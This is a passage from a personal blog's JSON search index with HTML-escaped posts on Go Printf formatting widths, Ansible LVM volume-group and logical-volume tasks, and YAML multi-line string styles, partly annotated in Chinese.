{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%+d\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1691\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// +1691\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%#x\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1691\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 0x69b\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%#X\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1691\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 0X69B\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%#b\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1691\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 0b11010011011\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%10d\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1691\u003c/span\u003e)  \u003cspan style=\"color:#75715e\"\u003e//       1691\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%-10d\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1691\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 1691\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%010d\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1691\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 0000001691\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"go-string-format-width\"\u003eGo string format width\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003ew\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;falcon\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e122\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eh\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e455.67\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%s\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ew\u003c/span\u003e)   \u003cspan style=\"color:#75715e\"\u003e// falcon\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%10s\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ew\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e//     falcon\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%d\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e).  \u003cspan style=\"color:#75715e\"\u003e// 122\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%7d\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e)  \u003cspan style=\"color:#75715e\"\u003e//     122\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%07d\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 0000122\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%10f\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eh\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 455.670000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%11f\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eh\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e//  455.670000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%12f\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eh\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e//   455.670000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go"],"title":"Go string format"},{"categories":["URL","Ansible","LVM"],"contents":" LVM - lvg and lvol volume group - name: 在 /dev/sda1 跟 /dev/sdb1 之上建立 volume group，其 extend size 設置為 32MB community.general.lvg: vg: vg.services pvs: /dev/sda1,/dev/sdb1 pesize: 32 local volume - name: 建立一個大小為 512m 的 local volume community.general.lvol: vg: firefly lv: test size: 512 Example --- - name: Create LVM for DRBD hosts: all become: yes vars: vg_name: drbdpool tasks: - name: Create a new primary partition for LVM community.general.parted: device: /dev/sdb number: 1 align: optimal flags: [lvm] state: present - name: Create a volume group on top of /dev/sda1 with physical extent size = 32MB community.general.lvg: vg: \u0026#34;{{ vg_name }}\u0026#34; pvs: /dev/sdb1 state: present - name: Create a logical volume community.general.lvol: vg: \u0026#34;{{ vg_name }}\u0026#34; lv: drbddata size: 100%FREE ","date":"September 5, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220905-system-lvm/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ansible.cloudns.pro/post/system/lvm/\" target=\"_blank\" rel=\"noopener\"\u003eLVM - lvg and lvol\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"volume-group\"\u003evolume group\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e- \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e在 /dev/sda1 跟 /dev/sdb1 之上建立 volume group，其 extend size 設置為 32MB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ecommunity.general.lvg\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003evg\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003evg.services\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003epvs\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e/dev/sda1,/dev/sdb1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003epesize\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e32\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"local-volume\"\u003elocal volume\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e- \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e建立一個大小為 512m 的 local volume\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ecommunity.general.lvol\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003evg\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003efirefly\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elv\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003etest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003esize\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"example\"\u003eExample\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e- \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eCreate LVM for DRBD\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ehosts\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eall\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ebecome\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003eyes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003evars\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003evg_name\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003edrbdpool\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003etasks\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eCreate a new primary partition for LVM\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003ecommunity.general.parted\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edevice\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e/dev/sdb\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003enumber\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003ealign\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eoptimal\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eflags\u003c/span\u003e: [\u003cspan style=\"color:#ae81ff\"\u003elvm]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003estate\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003epresent\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eCreate a volume group on top of /dev/sda1 with physical extent size = 32MB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003ecommunity.general.lvg\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003evg\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{{ vg_name }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003epvs\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e/dev/sdb1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003estate\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003epresent\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eCreate a logical volume\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003ecommunity.general.lvol\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003evg\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{{ vg_name }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elv\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003edrbddata\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003esize\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e%FREE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Ansible","LVM"],"title":"LVM - lvg and lvol"},{"categories":["URL","Ansible","YAML"],"contents":" YAML 裡的字串很長該怎麼做？ 在 YAML 裡已經有規範此部份，在這種情況有四種方法可以幫助我們：\n|: 其下內容的換行，就是換行，最後一行會有換行。 \u0026gt;: 其下內容的換行，不會是換行，會變為一個很長的字串，最後會有換行。 |-: 其下內容的換行，就是換行，但最後一行不會有換行。 \u0026gt;-: 其下內容的換常，不會是換行，最後一行也不會有換行。 簡單的說，\u0026gt; 跟 \u0026gt;- 可以增加 YAML 的可讀性，又不會有多餘的換行符號。而 | 跟 |- 則可以讓字串跟定義的一致，在 YAML 裡看到換行，那字串裡就會有換行符號。\n--- - name: Test long string hosts: all vars: s1: \u0026#34;hello\u0026#34; s2: | s2 this is my very very very long string line1 line2 line3 s3: \u0026gt; s3 this is my very very very long string line1 line2 line3 s4: |- s4 this is my very very very long string line1 line2 line3 s5: \u0026gt;- s5 this is my very very very long string line1 line2 line3 tasks: - name: s1 copy: content: \u0026#34;{{ s1 }}\u0026#34; dest: \u0026#34;/tmp/s1.txt\u0026#34; # hello% - name: s2 copy: content: \u0026#34;{{ s2 }}\u0026#34; dest: \u0026#34;/tmp/s2.txt\u0026#34; # s2 # this is my very very very # long string # line1 # line2 # line3 - name: s3 copy: content: \u0026#34;{{ s3 }}\u0026#34; dest: \u0026#34;/tmp/s3.txt\u0026#34; # s3 this is my very very very long string line1 line2 line3 - name: s4 copy: content: \u0026#34;{{ s4 }}\u0026#34; dest: \u0026#34;/tmp/s4.txt\u0026#34; # s4 # this is my very very very # long string # line1 # line2 # line3% - name: s5 copy: content: \u0026#34;{{ s5 }}\u0026#34; dest: \u0026#34;/tmp/s5.txt\u0026#34; # s5 this is my very very very long string line1 line2 line3% ","date":"August 29, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220829-long-string-in-yaml/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ansible.cloudns.pro/post/long-string-in-yaml/\" target=\"_blank\" rel=\"noopener\"\u003eYAML 裡的字串很長該怎麼做？\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e在 YAML 裡已經有規範此部份，在這種情況有四種方法可以幫助我們：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e|\u003c/code\u003e: 其下內容的換行，就是換行，最後一行會有換行。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\u0026gt;\u003c/code\u003e: 其下內容的換行，不會是換行，會變為一個很長的字串，最後會有換行。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e|-\u003c/code\u003e: 其下內容的換行，就是換行，但最後一行不會有換行。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\u0026gt;-\u003c/code\u003e: 其下內容的換常，不會是換行，最後一行也不會有換行。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e簡單的說，\u003ccode\u003e\u0026gt;\u003c/code\u003e 跟 \u003ccode\u003e\u0026gt;-\u003c/code\u003e 可以增加 YAML 的可讀性，又不會有多餘的換行符號。而 \u003ccode\u003e|\u003c/code\u003e 跟 \u003ccode\u003e|-\u003c/code\u003e 則可以讓字串跟定義的一致，在 YAML 裡看到換行，那字串裡就會有換行符號。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e- \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eTest long string\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ehosts\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eall\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003evars\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003es1\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hello\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003es2\u003c/span\u003e: |\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      s2\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      this is my very very very\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      long string\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line2\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003es3\u003c/span\u003e: \u0026gt;\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      s3\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      this is my very very very\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      long string\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line2\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 